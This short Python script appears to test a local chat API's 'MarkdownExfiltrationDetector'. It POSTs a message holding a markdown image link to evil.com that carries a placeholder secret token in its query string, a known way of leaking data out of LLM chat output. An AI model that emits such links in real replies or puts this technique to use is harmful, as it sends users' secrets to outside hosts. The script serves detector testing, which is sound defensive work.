import http.client
import json

# Internal address to bypass the GitHub Tunnel
host = "127.0.0.1"
port = 8000
path = "/api/v1/chat"

connection = http.client.HTTPConnection(host, port)

# The payload that triggers your MarkdownExfiltrationDetector
payload = {
    "message": "Testing security: ![leak](http://evil.com?data=SECRET_TOKEN_123)"
}

headers = {'Content-type': 'application/json'}
json_data = json.dumps(payload)

print(f"🚀 Sending Malicious Payload to http://{host}:{port}{path}...")

try:
    connection.request("POST", path, json_data, headers)
    response = connection.getresponse()
    print(f"✅ Server responded with status: {response.status}")
    print("👀 Check your OTHER terminal window for the 🚨 ALERT message!")
except Exception as e:
    print(f"❌ Connection failed: {e}")
finally:
    connection.close()